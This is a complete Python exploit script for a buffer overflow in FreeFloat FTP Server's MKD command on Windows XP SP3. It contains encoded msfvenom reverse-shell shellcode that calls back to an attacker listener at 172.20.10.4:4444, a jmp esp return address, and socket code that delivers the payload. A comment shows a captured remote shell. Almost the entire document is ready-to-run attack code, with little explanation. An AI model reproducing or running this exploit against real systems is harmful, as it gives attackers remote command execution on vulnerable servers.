#!/usr/bin/env python

# ---------------------------------------------
# Exploit: FreeFloat FTP (MKD Buffer Overflow)
# OS: WinXP Pro SP3
# Author: lucyoa
# ---------------------------------------------
# root@b00m:/usr/share/metasploit-framework# nc -lvp 4444
# listening on [any] 4444 ...
# 172.20.10.7: inverse host lookup failed: Unknown host
# connect to [172.20.10.4] from (UNKNOWN) [172.20.10.7] 2245
# Microsoft Windows XP [Wersja 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\Documents and Settings\lucyoa\Moje dokumenty\Downloads\Win32>
# --------------------------------------------

import sys
import socket


def main():
    # msfvenom -p windows/shell_reverse_tcp LHOST=172.20.10.4 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0d\x0a' -f c
    pay = ("\xd9\xd0\xd9\x74\x24\xf4\x5d\x2b\xc9\xb8\xd8\xb2\xd3\x94\xb1"
    "\x52\x83\xed\xfc\x31\x45\x13\x03\x9d\xa1\x31\x61\xe1\x2e\x37"
    "\x8a\x19\xaf\x58\x02\xfc\x9e\x58\x70\x75\xb0\x68\xf2\xdb\x3d"
    "\x02\x56\xcf\xb6\x66\x7f\xe0\x7f\xcc\x59\xcf\x80\x7d\x99\x4e"
    "\x03\x7c\xce\xb0\x3a\x4f\x03\xb1\x7b\xb2\xee\xe3\xd4\xb8\x5d"
    "\x13\x50\xf4\x5d\x98\x2a\x18\xe6\x7d\xfa\x1b\xc7\xd0\x70\x42"
    "\xc7\xd3\x55\xfe\x4e\xcb\xba\x3b\x18\x60\x08\xb7\x9b\xa0\x40"
    "\x38\x37\x8d\x6c\xcb\x49\xca\x4b\x34\x3c\x22\xa8\xc9\x47\xf1"
    "\xd2\x15\xcd\xe1\x75\xdd\x75\xcd\x84\x32\xe3\x86\x8b\xff\x67"
    "\xc0\x8f\xfe\xa4\x7b\xab\x8b\x4a\xab\x3d\xcf\x68\x6f\x65\x8b"
    "\x11\x36\xc3\x7a\x2d\x28\xac\x23\x8b\x23\x41\x37\xa6\x6e\x0e"
    "\xf4\x8b\x90\xce\x92\x9c\xe3\xfc\x3d\x37\x6b\x4d\xb5\x91\x6c"
    "\xb2\xec\x66\xe2\x4d\x0f\x97\x2b\x8a\x5b\xc7\x43\x3b\xe4\x8c"
    "\x93\xc4\x31\x02\xc3\x6a\xea\xe3\xb3\xca\x5a\x8c\xd9\xc4\x85"
    "\xac\xe2\x0e\xae\x47\x19\xd9\x7d\x83\x2b\x1d\x16\xae\x2b\x0c"
    "\xba\x27\xcd\x44\x52\x6e\x46\xf1\xcb\x2b\x1c\x60\x13\xe6\x59"
    "\xa2\x9f\x05\x9e\x6d\x68\x63\x8c\x1a\x98\x3e\xee\x8d\xa7\x94"
    "\x86\x52\x35\x73\x56\x1c\x26\x2c\x01\x49\x98\x25\xc7\x67\x83"
    "\x9f\xf5\x75\x55\xe7\xbd\xa1\xa6\xe6\x3c\x27\x92\xcc\x2e\xf1"
    "\x1b\x49\x1a\xad\x4d\x07\xf4\x0b\x24\xe9\xae\xc5\x9b\xa3\x26"
    "\x93\xd7\x73\x30\x9c\x3d\x02\xdc\x2d\xe8\x53\xe3\x82\x7c\x54"
    "\x9c\xfe\x1c\x9b\x77\xbb\x2d\xd6\xd5\xea\xa5\xbf\x8c\xae\xab"
    "\x3f\x7b\xec\xd5\xc3\x89\x8d\x21\xdb\xf8\x88\x6e\x5b\x11\xe1"
    "\xff\x0e\x15\x56\xff\x1a")

    # 0x77ddf049 : jmp esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] (C:\WINDOWS\system32\ADVAPI32.dll)
    ret = "\x49\xf0\xdd\x77"
    payload = "\x90"*247 + ret + "\x90" * 20 + pay

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))
    print s.recv(1024)

    s.send("USER test\r\n")
    print s.recv(1024)
    s.send("PASS test\r\n")
    print s.recv(1024)

    s.send("MKD " + payload + "\r\n")
    print s.recv(1024)

    s.send("QUIT\r\n")
    s.close()

if __name__ == "__main__":
    main()
